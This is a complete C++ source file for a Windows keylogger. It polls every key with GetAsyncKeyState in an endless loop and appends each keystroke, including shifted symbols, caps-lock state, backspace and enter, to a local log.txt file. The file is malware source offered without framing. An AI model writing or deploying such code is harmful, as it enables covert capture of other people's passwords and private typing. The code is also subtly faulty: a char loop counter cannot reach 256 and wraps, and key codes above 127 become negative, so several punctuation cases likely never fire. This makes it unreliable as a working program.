#include <fstream>
#include <Windows.h>
#include <iostream>

using namespace std;
int i = 0;
int save(int key);

int main()
{
	char input;
	while (true)
	{
		for (input = 8; input <= 256; input++)
		{
			if (GetAsyncKeyState(input) == -32767)
				save(input);
		}
	}
	return 0;
}

int save(int key)
{

	ofstream fout;
	fout.open("log.txt", ios::out | ios::app);

	if (GetAsyncKeyState(VK_SHIFT)) //when shift is pressed
	{
		switch (key)
		{

		case 48:
			fout << ")";
			break;

		case 49:
			fout << "!";
			break;

		case 50:
			fout << "@";
			break;

		case 51:
			fout << "#";
			break;

		case 52:
			fout << "$";
			break;

		case 53:
			fout << "%";
			break;

		case 54:
			fout << "^";
			break;

		case 55:
			fout << "&";
			break;

		case 56:
			fout << "*";
			break;

		case 57:
			fout << "(";
			break;

		case 186:
			fout << ":";
			break;

		case 187:
			fout << "+";
			break;

		case 188:
			fout << "<";
			break;

		case 189:
			fout << "_";
			break;

		case 190:
			fout << ">";
			break;

		case 191:
			fout << "\?";
			break;

		case 192:
			fout << "~";
			break;

		case 219:
			fout << "{";
			break;

		case 220:
			fout << "|";
			break;

		case 221:
			fout << "}";
			break;

		case 222:
			fout << "\"";
			break;
		default:
		        if (i % 2 != 0)
		         fout << (char)(key + 32);
			else
		         fout << (char)key;
		        break;
	
		}
	}

	else
	{switch (key)
	{
	case 8:
		fout << "[backspace]";
		break;

	case 9:
		fout << "[horizontal tab]";
		break;
	case 32:
		fout << "[space]"<< " ";
		break;
	case 13:
		fout << endl<< "[enter]" << endl;
		break;
	case 20: //toggle

		if (i % 2 == 0)
			fout << "[capsON]";
		else
			fout << "[capsOFF]";
		i++;
		break;

	case 186:
		fout << ";";
		break;

	case 187:
		fout << "=";
		break;

	case 188:
		fout << ",";
		break;

	case 189:
		fout << "-";
		break;

	case 190:
		fout << ".";
		break;

	case 191:
		fout << "/";
		break;

	case 192:
		fout << "`";
		break;

	case 219:
		fout << "[";
		break;

	case 220:
		fout << "\\";
		break;

	case 221:
		fout << "]";
		break;

	case 222:
		fout << "\'";
		break;

	default:
		if (key >= 48 && key <= 57) //numbers
			fout<< (char)key;

		else //alphabets
		{

			if (i % 2 == 0)
				fout << (char)(key + 32);
			else
				fout << (char)key;
		}
		break;
	}
	}
	
	fout.close();
	return 0;
}
